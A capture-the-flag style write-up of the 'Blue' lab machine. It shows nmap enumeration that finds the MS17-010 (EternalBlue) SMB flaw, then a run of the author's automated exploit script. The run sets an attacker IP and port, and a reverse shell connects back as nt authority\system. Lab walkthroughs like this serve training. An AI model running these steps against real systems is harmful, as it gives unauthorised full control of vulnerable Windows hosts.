# Blue

## Enumeration

Start with an nmap scan that will output every open port in grep format to the archive allPorts
```bash
$ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.40 -vvv -oG allPorts
```

After doing that I use a function named xps to extract the ports and run a command that will enumerate all the versions and scripts of each port 

```bash
$ xps allPorts
[+] command copied to clipboard, run:
sudo nmap -sVC -p135,139,445,49152,49153,49154,49155,49156,49157 --min-rate=5000 -n -Pn 10.10.10.40 -oN targeted
```

I modified the output to only scan those related to smb and enumerate the scripts with "vuln and safe" categories

```bash
$ sudo nmap -sVC --script="vuln and safe" -p135,139,445 --min-rate=5000 -n -Pn 10.10.10.40 -oN targeted
```

The scan shows that the machine is vulnerable to eternal-blue ms17-010

```java
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

## shell as nt authority/system
To exploit this vulnerability I use a bash script I made that will automate all the process [bluepwn-ms17-010](https://github.com/sentreysec/bluepwn-ms17-010)

```bash
$ git clone https://github.com/sentreysec/bluepwn-ms17-010
$ cd bluepwn-ms17-010
$ ./bluepwn.sh
```

the process is the following first I retrieve the information of the target with the objective to know its architecture, in this case I have a x64 windows 7 machine  

```java
Choose an option
[1] Get Target information
[2] Run exploit
[0] Exit
[>] 1
[?] IP of the target: 10.10.10.40
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
[?] Would you like to go back?
[Y/n] y
```

Then I run the exploit setting up the correct parameters such as ip address port and architecture

```java
Choose an option
[1] Get Target information
[2] Run exploit
[0] Exit
[>] 2
[?] Target IP: 10.10.10.40
[?] Your IP: 10.10.14.13
[?] Your Port: 9001
[?] Architecture of the host
	[1] x86
	[2] x64
[>] 2
```

The tool automatically retries the exploit in order to make it work, finally after some retries it spawns a shell as nt authority\system

```bash
[!] Retrying...
If the issue persists is probably that the target machine got rebooted
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

